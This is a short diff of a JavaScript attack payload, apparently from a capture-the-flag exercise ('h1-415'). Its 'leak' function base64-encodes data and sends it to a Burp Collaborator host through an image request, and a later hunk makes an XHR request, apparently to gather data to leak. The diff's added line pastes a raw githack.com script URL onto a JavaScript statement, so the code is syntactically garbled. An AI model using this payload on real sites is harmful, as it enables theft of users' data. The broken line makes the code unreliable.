@@ -1,6 +1,6 @@
 leak = function(name, data)
 {
-   var i = document.createElement('img');
+   var i = document.createElement('img');https://raw.githack.com/p4fg/h1-415/6040c3ace29f6bff4d555d4e315f0230e10072b3/submit.js
    i.src = "https://3676nv4yy7gt4c0979zitrv3zu5wtl.burpcollaborator.net/leak?" + name + "=" + btoa(data);
    document.body.appendChild(i); 
 }
@@ -55,4 +55,5 @@ XHR2.onload = function() {
    }
 };
 XHR2.send();
+
 
